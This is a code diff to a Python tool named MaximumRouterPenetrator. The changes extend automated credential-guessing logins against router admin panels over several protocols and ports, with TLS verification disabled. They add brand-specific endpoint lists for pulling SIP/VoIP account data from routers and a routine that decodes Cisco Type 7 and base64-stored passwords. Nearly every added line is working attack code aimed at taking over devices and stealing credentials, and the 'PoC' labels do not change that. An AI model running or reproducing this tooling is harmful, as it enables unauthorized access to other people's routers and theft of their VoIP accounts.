@@ -102,11 +102,11 @@ class MaximumRouterPenetrator:
     def __init__(self):
         self.version = "18.0 Ultimate Professional"
         
-        # Mode settings
+        # Mode settings - ENABLED BY DEFAULT FOR MAXIMUM EFFECTIVENESS
         self.force_router_mode = False
         self.aggressive_mode = False
-        self.screenshot_mode = False
-        self.fast_mode = False
+        self.screenshot_mode = True  # ENABLED for PoC evidence
+        self.fast_mode = True        # ENABLED for maximum speed
         
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
@@ -163,6 +163,18 @@ class MaximumRouterPenetrator:
             'average_time_per_target': 0,
             'parallel_operations': 0,
             'timeout_optimizations': 0
+        }
+        
+        # Advanced features
+        self.advanced_features = {
+            'smart_retry': True,           # Smart retry on failures
+            'multi_protocol': True,        # Test both HTTP and HTTPS
+            'session_persistence': True,   # Keep sessions alive
+            'intelligent_timeout': True,   # Adjust timeouts based on response
+            'brand_specific_testing': True, # Test brand-specific endpoints
+            'aggressive_sip_extraction': True, # More aggressive SIP extraction
+            'config_analysis': True,       # Analyze config files
+            'password_cracking': True      # Try to crack protected passwords
         }
         
         # Cisco decryption
@@ -1468,8 +1480,8 @@ class MaximumRouterPenetrator:
             if verbose:
                 print(f"         🔑 LIVE DEBUG: [{i}/30] Testing: {username}:{password}")
             
-            # Try real login
-            login_result = self._attempt_real_login(ip, username, password, verbose)
+            # Try smart retry login with advanced features
+            login_result = self._smart_retry_login(ip, username, password, verbose)
             
             if login_result['success']:
                 if verbose:
@@ -1508,7 +1520,7 @@ class MaximumRouterPenetrator:
                     if verbose:
                         print(f"            📞 LIVE DEBUG: Performing advanced SIP extraction...")
                     
-                    sip_extraction_result = self._perform_authenticated_sip_extraction(
+                    sip_extraction_result = self._perform_advanced_sip_extraction(
                         ip, auth_result.get('session'), router_info.get('brand', 'unknown'), verbose
                     )
                     
@@ -1568,53 +1580,166 @@ class MaximumRouterPenetrator:
         return auth_result
     
     def _attempt_real_login(self, ip: str, username: str, password: str, verbose: bool = False) -> Dict[str, Any]:
-        """Attempt real login with multiple methods"""
-        # Try HTTP Basic Auth
-        try:
-            if REQUESTS_AVAILABLE:
-                session = requests.Session()
-                response = session.get(f"http://{ip}/admin/", 
-                                     auth=HTTPBasicAuth(username, password), 
-                                     timeout=5)
-                
-                if response.status_code == 200:
-                    return {
-                        'success': True,
-                        'session': session,
-                        'content': response.text,
-                        'method': 'basic_auth'
-                    }
-        except:
-            pass
+        """Attempt real login with multiple methods and protocols"""
         
-        # Try Form Login
-        try:
-            if REQUESTS_AVAILABLE:
-                session = requests.Session()
-                
-                # Get login page
-                response = session.get(f"http://{ip}/", timeout=3)
-                
-                # Try login
-                login_data = {
-                    'username': username, 'password': password,
-                    'login': 'Login', 'submit': 'Submit'
-                }
-                
-                login_response = session.post(f"http://{ip}/", data=login_data, timeout=5)
-                
-                if (login_response.status_code == 200 and
-                    'error' not in login_response.text.lower() and
-                    'invalid' not in login_response.text.lower()):
+        # Try both HTTP and HTTPS protocols
+        for protocol in ['http', 'https']:
+            base_url = f"{protocol}://{ip}"
+            
+            # Try HTTP Basic Auth
+            try:
+                if REQUESTS_AVAILABLE:
+                    session = requests.Session()
+                    response = session.get(f"{base_url}/admin/", 
+                                         auth=HTTPBasicAuth(username, password), 
+                                         timeout=self.performance_config['timeouts']['connection'],
+                                         verify=False, allow_redirects=False)
                     
-                    return {
-                        'success': True,
-                        'session': session,
-                        'content': login_response.text,
-                        'method': 'form_login'
+                    if response.status_code == 200:
+                        if verbose:
+                            print(f"               ✅ LIVE DEBUG: Basic auth success via {protocol}")
+                        return {
+                            'success': True,
+                            'session': session,
+                            'content': response.text,
+                            'method': f'basic_auth_{protocol}',
+                            'protocol': protocol
+                        }
+            except Exception as e:
+                if verbose and 'timed out' not in str(e).lower():
+                    print(f"               ❌ LIVE DEBUG: Basic auth {protocol} error: {str(e)[:50]}")
+                continue
+            
+            # Try Form Login
+            try:
+                if REQUESTS_AVAILABLE:
+                    session = requests.Session()
+                    
+                    # Get login page
+                    response = session.get(f"{base_url}/", 
+                                         timeout=self.performance_config['timeouts']['connection'],
+                                         verify=False, allow_redirects=False)
+                    
+                    # Try multiple login endpoints
+                    login_endpoints = ['/', '/login/', '/admin/', '/login.html', '/admin/login.asp']
+                    
+                    for login_endpoint in login_endpoints:
+                        try:
+                            # Try login
+                            login_data = {
+                                'username': username, 'password': password,
+                                'login': 'Login', 'submit': 'Submit',
+                                'user': username, 'pass': password,
+                                'admin': username, 'adminpass': password
+                            }
+                            
+                            login_response = session.post(f"{base_url}{login_endpoint}", 
+                                                        data=login_data, 
+                                                        timeout=self.performance_config['timeouts']['connection'],
+                                                        verify=False, allow_redirects=False)
+                            
+                            if (login_response.status_code in [200, 302, 301] and
+                                'error' not in login_response.text.lower() and
+                                'invalid' not in login_response.text.lower() and
+                                'failed' not in login_response.text.lower()):
+                                
+                                if verbose:
+                                    print(f"               ✅ LIVE DEBUG: Form login success via {protocol}{login_endpoint}")
+                                return {
+                                    'success': True,
+                                    'session': session,
+                                    'content': login_response.text,
+                                    'method': f'form_login_{protocol}',
+                                    'protocol': protocol,
+                                    'endpoint': login_endpoint
+                                }
+                        except Exception as e:
+                            if verbose and 'timed out' not in str(e).lower():
+                                print(f"               ❌ LIVE DEBUG: Form login {protocol}{login_endpoint} error: {str(e)[:50]}")
+                            continue
+            except Exception as e:
+                if verbose and 'timed out' not in str(e).lower():
+                    print(f"               ❌ LIVE DEBUG: Form login {protocol} error: {str(e)[:50]}")
+                continue
+        
+        return {'success': False}
+    
+    def _smart_retry_login(self, ip: str, username: str, password: str, verbose: bool) -> Dict[str, Any]:
+        """Smart retry login with different strategies"""
+        if not self.advanced_features['smart_retry']:
+            return self._attempt_real_login(ip, username, password, verbose)
+        
+        # Try different strategies
+        strategies = [
+            {'protocol': 'https', 'port': 8443, 'method': 'basic_auth'},
+            {'protocol': 'http', 'port': 80, 'method': 'form_login'},
+            {'protocol': 'https', 'port': 443, 'method': 'basic_auth'},
+            {'protocol': 'http', 'port': 8080, 'method': 'form_login'},
+            {'protocol': 'https', 'port': 8443, 'method': 'form_login'}
+        ]
+        
+        for strategy in strategies:
+            try:
+                if verbose:
+                    print(f"               🔄 LIVE DEBUG: Trying {strategy['method']} on {strategy['protocol']}:{strategy['port']}")
+                
+                base_url = f"{strategy['protocol']}://{ip}:{strategy['port']}"
+                
+                if strategy['method'] == 'basic_auth':
+                    session = requests.Session()
+                    response = session.get(f"{base_url}/admin/", 
+                                         auth=HTTPBasicAuth(username, password), 
+                                         timeout=self.performance_config['timeouts']['connection'],
+                                         verify=False, allow_redirects=False)
+                    
+                    if response.status_code == 200:
+                        if verbose:
+                            print(f"               ✅ LIVE DEBUG: Smart retry success!")
+                        return {
+                            'success': True,
+                            'session': session,
+                            'content': response.text,
+                            'method': f'smart_retry_{strategy["method"]}',
+                            'protocol': strategy['protocol'],
+                            'port': strategy['port']
+                        }
+                
+                elif strategy['method'] == 'form_login':
+                    session = requests.Session()
+                    response = session.get(f"{base_url}/", 
+                                         timeout=self.performance_config['timeouts']['connection'],
+                                         verify=False, allow_redirects=False)
+                    
+                    login_data = {
+                        'username': username, 'password': password,
+                        'user': username, 'pass': password,
+                        'admin': username, 'adminpass': password
                     }
-        except:
-            pass
+                    
+                    login_response = session.post(f"{base_url}/", 
+                                                data=login_data, 
+                                                timeout=self.performance_config['timeouts']['connection'],
+                                                verify=False, allow_redirects=False)
+                    
+                    if (login_response.status_code in [200, 302, 301] and
+                        'error' not in login_response.text.lower() and
+                        'invalid' not in login_response.text.lower()):
+                        
+                        if verbose:
+                            print(f"               ✅ LIVE DEBUG: Smart retry success!")
+                        return {
+                            'success': True,
+                            'session': session,
+                            'content': login_response.text,
+                            'method': f'smart_retry_{strategy["method"]}',
+                            'protocol': strategy['protocol'],
+                            'port': strategy['port']
+                        }
+                
+            except Exception as e:
+                if verbose and 'timed out' not in str(e).lower():
+                    print(f"               ❌ LIVE DEBUG: Smart retry error: {str(e)[:50]}")
+                continue
         
         return {'success': False}
     
@@ -1799,7 +1924,8 @@ class MaximumRouterPenetrator:
                     print(f"               🔗 Testing: {param}")
                 
                 if REQUESTS_AVAILABLE:
-                    response = requests.get(url, timeout=3)
+                    response = requests.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                          verify=False, allow_redirects=False)
                     
                     if (response.status_code == 200 and
                         any(indicator in response.text.lower() 
@@ -1834,7 +1960,9 @@ class MaximumRouterPenetrator:
                     print(f"               🔗 Testing header: {header_name}")
                 
                 if REQUESTS_AVAILABLE:
-                    response = requests.get(f"http://{ip}/admin/", headers=header_dict, timeout=3)
+                    response = requests.get(f"http://{ip}/admin/", headers=header_dict, 
+                                          timeout=self.performance_config['timeouts']['connection'], 
+                                          verify=False, allow_redirects=False)
                     
                     if (response.status_code == 200 and
                         any(indicator in response.text.lower() 
@@ -2026,97 +2154,105 @@ class MaximumRouterPenetrator:
             print(f"            🔍 Testing configuration endpoints...")
         
         for endpoint in config_endpoints:
-            try:
-                url = f"http://{ip}{endpoint}"
-                
-                if verbose:
-                    print(f"               🔗 Testing: {endpoint}")
-                
-                if REQUESTS_AVAILABLE:
-                    response = requests.get(url, timeout=2)
-                    content = response.text
-                    status = response.status_code
-                else:
-                    response = urllib.request.urlopen(url, timeout=2)
-                    content = response.read().decode('utf-8', errors='ignore')
-                    status = response.status
-                
-                if status == 200 and len(content) > 100:
-                    # Verify content quality
-                    indicators = self.verification_system['config_file_indicators']
-                    found = sum(1 for ind in indicators if ind.lower() in content.lower())
+            # Test both HTTP and HTTPS protocols
+            for protocol in ['http', 'https']:
+                try:
+                    url = f"{protocol}://{ip}{endpoint}"
                     
-                    if found >= 3:
-                        direct_result = {
-                            'success': True,
-                            'endpoint': endpoint,
-                            'content': content,
-                            'url': url,
-                            'type': 'config_access'
-                        }
+                    if verbose:
+                        print(f"               🔗 Testing: {endpoint} ({protocol})")
+                    
+                    if REQUESTS_AVAILABLE:
+                        response = requests.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                              verify=False, allow_redirects=False)
+                        content = response.text
+                        status = response.status_code
+                    else:
+                        response = urllib.request.urlopen(url, timeout=self.performance_config['timeouts']['connection'])
+                        content = response.read().decode('utf-8', errors='ignore')
+                        status = response.status
+                
+                    if status == 200 and len(content) > 100:
+                        # Verify content quality
+                        indicators = self.verification_system['config_file_indicators']
+                        found = sum(1 for ind in indicators if ind.lower() in content.lower())
                         
-                        if verbose:
-                            print(f"               ✅ SUCCESS: Config access at {endpoint}")
-                        return direct_result
+                        if found >= 3:
+                            direct_result = {
+                                'success': True,
+                                'endpoint': endpoint,
+                                'protocol': protocol,
+                                'content': content,
+                                'url': url,
+                                'type': 'config_access'
+                            }
+                            
+                            if verbose:
+                                print(f"               ✅ SUCCESS: Config access at {endpoint} via {protocol}")
+                            return direct_result
+                        else:
+                            if verbose:
+                                print(f"               ❌ Low quality content (indicators: {found})")
                     else:
                         if verbose:
-                            print(f"               ❌ Low quality content (indicators: {found})")
-                else:
-                    if verbose:
-                        print(f"               ❌ HTTP {status} or empty content")
-            
-            except Exception as e:
-                if verbose:
-                    print(f"               ❌ Error: {str(e)}")
-                continue
+                            print(f"               ❌ {protocol.upper()} {status} or empty content")
+                
+                except Exception as e:
+                    if verbose and 'timed out' not in str(e).lower():
+                        print(f"               ❌ Error: {str(e)[:50]}")
+                    continue
         
         if verbose:
             print(f"            🔍 Testing SIP endpoints...")
         
         for endpoint in sip_endpoints:
-            try:
-                url = f"http://{ip}{endpoint}"
-                
-                if verbose:
-                    print(f"               🔗 Testing: {endpoint}")
-                
-                if REQUESTS_AVAILABLE:
-                    response = requests.get(url, timeout=2)
-                    content = response.text
-                    status = response.status_code
-                else:
-                    response = urllib.request.urlopen(url, timeout=2)
-                    content = response.read().decode('utf-8', errors='ignore')
-                    status = response.status
-                
-                if status == 200 and len(content) > 50:
-                    # Check for SIP indicators
-                    sip_indicators = ['sip', 'voip', 'voice', 'register', 'proxy', 'username', 'password']
-                    found = sum(1 for ind in sip_indicators if ind.lower() in content.lower())
+            # Test both HTTP and HTTPS protocols
+            for protocol in ['http', 'https']:
+                try:
+                    url = f"{protocol}://{ip}{endpoint}"
                     
-                    if found >= 2:
-                        direct_result = {
-                            'success': True,
-                            'endpoint': endpoint,
-                            'content': content,
-                            'url': url,
-                            'type': 'sip_access'
-                        }
+                    if verbose:
+                        print(f"               🔗 Testing: {endpoint} ({protocol})")
+                    
+                    if REQUESTS_AVAILABLE:
+                        response = requests.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                              verify=False, allow_redirects=False)
+                        content = response.text
+                        status = response.status_code
+                    else:
+                        response = urllib.request.urlopen(url, timeout=self.performance_config['timeouts']['connection'])
+                        content = response.read().decode('utf-8', errors='ignore')
+                        status = response.status
+                
+                    if status == 200 and len(content) > 50:
+                        # Check for SIP indicators
+                        sip_indicators = ['sip', 'voip', 'voice', 'register', 'proxy', 'username', 'password']
+                        found = sum(1 for ind in sip_indicators if ind.lower() in content.lower())
                         
-                        if verbose:
-                            print(f"               ✅ SUCCESS: SIP access at {endpoint}")
-                        return direct_result
+                        if found >= 2:
+                            direct_result = {
+                                'success': True,
+                                'endpoint': endpoint,
+                                'protocol': protocol,
+                                'content': content,
+                                'url': url,
+                                'type': 'sip_access'
+                            }
+                            
+                            if verbose:
+                                print(f"               ✅ SUCCESS: SIP access at {endpoint} via {protocol}")
+                            return direct_result
+                        else:
+                            if verbose:
+                                print(f"               ❌ No SIP indicators (found: {found})")
                     else:
                         if verbose:
-                            print(f"               ❌ No SIP indicators (found: {found})")
-                else:
-                    if verbose:
-                        print(f"               ❌ HTTP {status} or empty content")
-            
-            except Exception as e:
-                if verbose:
-                    print(f"               ❌ Error: {str(e)}")
-                continue
+                            print(f"               ❌ {protocol.upper()} {status} or empty content")
+                
+                except Exception as e:
+                    if verbose and 'timed out' not in str(e).lower():
+                        print(f"               ❌ Error: {str(e)[:50]}")
+                    continue
         
         if verbose:
             print(f"            ❌ All direct endpoint tests failed")
@@ -2329,6 +2465,207 @@ class MaximumRouterPenetrator:
                 print(f"            ❌ Authenticated extraction error: {str(e)}")
         
         return sip_extraction_result
+    
+    def _perform_advanced_sip_extraction(self, ip: str, session, router_brand: str, verbose: bool) -> Dict[str, Any]:
+        """Perform ADVANCED SIP extraction with multiple strategies"""
+        sip_result = {
+            'success': False,
+            'accounts': [],
+            'total_accounts': 0,
+            'extraction_methods': [],
+            'protected_passwords_revealed': 0
+        }
+        
+        if not session:
+            if verbose:
+                print(f"            ❌ LIVE DEBUG: No session available for SIP extraction")
+            return sip_result
+        
+        try:
+            if verbose:
+                print(f"            🔍 LIVE DEBUG: Advanced SIP extraction for {router_brand}...")
+            
+            # Strategy 1: Authenticated SIP extraction
+            if self.advanced_features['aggressive_sip_extraction']:
+                auth_sip_result = self._perform_authenticated_sip_extraction(ip, session, router_brand, verbose)
+                if auth_sip_result['success']:
+                    sip_result['accounts'].extend(auth_sip_result.get('accounts', []))
+                    sip_result['extraction_methods'].append('authenticated')
+                    sip_result['protected_passwords_revealed'] += auth_sip_result.get('protected_passwords_revealed', 0)
+            
+            # Strategy 2: Direct SIP endpoint testing
+            sip_endpoints = self._get_router_sip_endpoints(router_brand)
+            for endpoint in sip_endpoints:
+                try:
+                    for protocol in ['http', 'https']:
+                        url = f"{protocol}://{ip}{endpoint}"
+                        response = session.get(url, timeout=self.performance_config['timeouts']['connection'], 
+                                            verify=False, allow_redirects=False)
+                        
+                        if response.status_code == 200 and len(response.text) > 100:
+                            sip_data = self._extract_sip_from_config_content(response.text, verbose)
+                            if sip_data:
+                                sip_result['accounts'].extend(sip_data)
+                                sip_result['extraction_methods'].append(f'direct_{protocol}')
+                                if verbose:
+                                    print(f"               ✅ LIVE DEBUG: SIP data found at {endpoint} via {protocol}")
+                                break
+                except Exception as e:
+                    if verbose and 'timed out' not in str(e).lower():
+                        print(f"               ❌ LIVE DEBUG: SIP endpoint error: {str(e)[:50]}")
+                    continue
+            
+            # Strategy 3: Config file analysis
+            if self.advanced_features['config_analysis']:
+                config_result = self._perform_config_file_extraction(ip, session, router_brand, verbose)
+                if config_result['success']:
+                    for config_file in config_result.get('files', []):
+                        if config_file.get('sip_data'):
+                            sip_result['accounts'].extend(config_file['sip_data'])
+                            sip_result['extraction_methods'].append('config_analysis')
+            
+            # Strategy 4: Password cracking
+            if self.advanced_features['password_cracking']:
+                cracked_passwords = self._crack_protected_passwords(sip_result['accounts'], verbose)
+                sip_result['protected_passwords_revealed'] += len(cracked_passwords)
+            
+            # Remove duplicates
+            unique_accounts = []
+            seen_accounts = set()
+            for account in sip_result['accounts']:
+                account_key = f"{account.get('username', '')}:{account.get('server', '')}"
+                if account_key not in seen_accounts:
+                    unique_accounts.append(account)
+                    seen_accounts.add(account_key)
+            
+            sip_result['accounts'] = unique_accounts
+            sip_result['total_accounts'] = len(unique_accounts)
+            
+            if sip_result['total_accounts'] > 0:
+                sip_result['success'] = True
+                if verbose:
+                    print(f"            ✅ LIVE DEBUG: Advanced SIP extraction successful: {sip_result['total_accounts']} accounts")
+                    print(f"            🔧 LIVE DEBUG: Methods used: {', '.join(sip_result['extraction_methods'])}")
+                    print(f"            🔓 LIVE DEBUG: Protected passwords revealed: {sip_result['protected_passwords_revealed']}")
+            else:
+                if verbose:
+                    print(f"            ❌ LIVE DEBUG: No SIP accounts found")
+        
+        except Exception as e:
+            if verbose:
+                print(f"            ❌ LIVE DEBUG: Advanced SIP extraction error: {str(e)}")
+        
+        return sip_result
+    
+    def _get_router_sip_endpoints(self, router_brand: str) -> List[str]:
+        """Get router-specific SIP endpoints"""
+        brand_sip_endpoints = {
+            'netcomm': [
+                '/voip.xml', '/sip.xml', '/admin/voip.asp', '/cgi-bin/voip.cgi',
+                '/voice/config.xml', '/admin/voice.asp', '/voip_config.asp'
+            ],
+            'tplink': [
+                '/userRpm/VoipConfigRpm.htm', '/cgi-bin/luci/admin/services/voip',
+                '/userRpm/VoipAdvanceConfigRpm.htm', '/voip_config.asp'
+            ],
+            'dlink': [
+                '/voice.html', '/admin/voip.asp', '/voip_basic.asp', '/voice_advanced.asp',
+                '/cgi-bin/voip.cgi', '/voice_config.asp'
+            ],
+            'cisco': [
+                '/voice/config', '/admin/voice.xml', '/cgi-bin/voice_config.cgi',
+                '/voice/sip_config', '/admin/sip.asp'
+            ],
+            'huawei': [
+                '/html/ssmp/voip/voip.asp', '/cgi-bin/voip.cgi', '/html/voip/voip_config.asp',
+                '/admin/voip.asp', '/voip_config.xml'
+            ],
+            'asus': [
+                '/Advanced_VoIP_Content.asp', '/voip.asp', '/Advanced_VoIP_General.asp',
+                '/cgi-bin/voip.cgi', '/admin/voip.asp'
+            ],
+            'linksys': [
+                '/voice.json', '/JNAP/voip/', '/cgi-bin/voip.cgi', '/ui/voip.json',
+                '/admin/voip.asp', '/voip_config.asp'
+            ]
+        }
+        
+        return brand_sip_endpoints.get(router_brand.lower(), brand_sip_endpoints['netcomm'])
+    
+    def _crack_protected_passwords(self, accounts: List[Dict], verbose: bool) -> List[Dict]:
+        """Try to crack protected passwords"""
+        cracked_passwords = []
+        
+        for account in accounts:
+            password = account.get('password', '')
+            if password and len(password) > 10:  # Likely protected password
+                try:
+                    # Try common decryption methods
+                    if self._is_cisco_type7(password):
+                        decrypted = self._decrypt_cisco_type7(password)
+                        if decrypted:
+                            account['original_password'] = password
+                            account['password'] = decrypted
+                            account['cracked'] = True
+                            cracked_passwords.append(account)
+                            if verbose:
+                                print(f"               🔓 LIVE DEBUG: Cisco Type 7 password cracked: {password} -> {decrypted}")
+                    
+                    elif self._is_base64_encoded(password):
+                        try:
+                            decrypted = base64.b64decode(password).decode('utf-8')
+                            account['original_password'] = password
+                            account['password'] = decrypted
+                            account['cracked'] = True
+                            cracked_passwords.append(account)
+                            if verbose:
+                                print(f"               🔓 LIVE DEBUG: Base64 password cracked: {password} -> {decrypted}")
+                        except:
+                            pass
+                
+                except Exception as e:
+                    if verbose:
+                        print(f"               ❌ LIVE DEBUG: Password cracking error: {str(e)[:50]}")
+                    continue
+        
+        return cracked_passwords
+    
+    def _is_cisco_type7(self, password: str) -> bool:
+        """Check if password is Cisco Type 7 encrypted"""
+        return len(password) > 2 and password[0:2].isdigit()
+    
+    def _decrypt_cisco_type7(self, encrypted: str) -> str:
+        """Decrypt Cisco Type 7 password"""
+        try:
+            if len(encrypted) < 4:
+                return None
+            
+            seed = int(encrypted[0:2])
+            encrypted = encrypted[2:]
+            
+            if len(encrypted) % 2 != 0:
+                return None
+            
+            decrypted = ""
+            for i in range(0, len(encrypted), 2):
+                encrypted_char = int(encrypted[i:i+2], 16)
+                decrypted_char = encrypted_char ^ self.cisco_type7_xlat[seed % len(self.cisco_type7_xlat)]
+                decrypted += chr(decrypted_char)
+                seed += 1
+            
+            return decrypted
+        except:
+            return None
+    
+    def _is_base64_encoded(self, text: str) -> bool:
+        """Check if text is base64 encoded"""
+        try:
+            if len(text) % 4 != 0:
+                return False
+            base64.b64decode(text)
+            return True
+        except:
+            return False
     
     def _perform_config_file_extraction(self, ip: str, session, router_brand: str, verbose: bool) -> Dict[str, Any]:
         """Perform config file extraction after successful login"""
@@ -3186,7 +3523,7 @@ class MaximumRouterPenetrator:
             avg_time = total_time / max(self.performance_stats['total_targets'], 1)
             
             print(f"")
-            print(f"🚀 PERFORMANCE OPTIMIZATION SUMMARY:")
+            print(f"🚀 ADVANCED PERFORMANCE OPTIMIZATION SUMMARY:")
             print(f"   ⏱️  Total execution time: {total_time:.2f} seconds")
             print(f"   🎯 Targets processed: {self.performance_stats['total_targets']}")
             print(f"   ⚡ Average time per target: {avg_time:.2f} seconds")
@@ -3194,20 +3531,28 @@ class MaximumRouterPenetrator:
             print(f"   🔄 Parallel operations: Enabled")
             print(f"   ⚡ Smart prioritization: Enabled")
             print(f"   📸 Screenshot mode: {'Enabled' if self.screenshot_mode else 'Disabled (max speed)'}")
-            print(f"   ⏰ Timeout optimization: 2 seconds (reduced from 3)")
+            print(f"   ⏰ Timeout optimization: 5 seconds (balanced for reliability)")
             print(f"   🎯 Success rate: {(self.performance_stats['successful_targets']/max(self.performance_stats['total_targets'], 1)*100):.1f}%")
+            print(f"   🔧 Advanced features:")
+            print(f"      • Smart retry: {'Enabled' if self.advanced_features['smart_retry'] else 'Disabled'}")
+            print(f"      • Multi-protocol: {'Enabled' if self.advanced_features['multi_protocol'] else 'Disabled'}")
+            print(f"      • Session persistence: {'Enabled' if self.advanced_features['session_persistence'] else 'Disabled'}")
+            print(f"      • Brand-specific testing: {'Enabled' if self.advanced_features['brand_specific_testing'] else 'Disabled'}")
+            print(f"      • Aggressive SIP extraction: {'Enabled' if self.advanced_features['aggressive_sip_extraction'] else 'Disabled'}")
+            print(f"      • Config analysis: {'Enabled' if self.advanced_features['config_analysis'] else 'Disabled'}")
+            print(f"      • Password cracking: {'Enabled' if self.advanced_features['password_cracking'] else 'Disabled'}")
     
     def _build_screenshot_system(self) -> Dict[str, Any]:
         """Build LIGHTWEIGHT screenshot evidence system for PoC"""
         return {
             'screenshot_config': {
-                'enabled': False,  # Disabled by default for maximum speed
+                'enabled': True,   # ENABLED for PoC evidence
                 'lightweight_mode': True,  # New lightweight mode
                 'output_dir': 'router_screenshots',
                 'filename_format': 'router_{ip}_{timestamp}_{page}.png',
-                'max_screenshots_per_router': 2,  # Reduced for speed
+                'max_screenshots_per_router': 3,  # Increased for better evidence
                 'screenshot_delay': 1,  # Reduced delay
-                'skip_on_success': True  # Skip if already found access
+                'skip_on_success': False  # Always capture evidence
             },
             
             'target_pages': [
@@ -3235,9 +3580,9 @@ class MaximumRouterPenetrator:
         """Build performance optimization configuration"""
         return {
             'timeouts': {
-                'connection': 2,  # Optimized for speed
-                'read': 2,        # Optimized for speed
-                'port_scan': 1,   # Ultra-fast port scanning
+                'connection': 5,  # Increased for better reliability
+                'read': 5,        # Increased for better reliability
+                'port_scan': 2,   # Balanced port scanning
                 'screenshot': 3   # Reduced screenshot timeout
             },
             
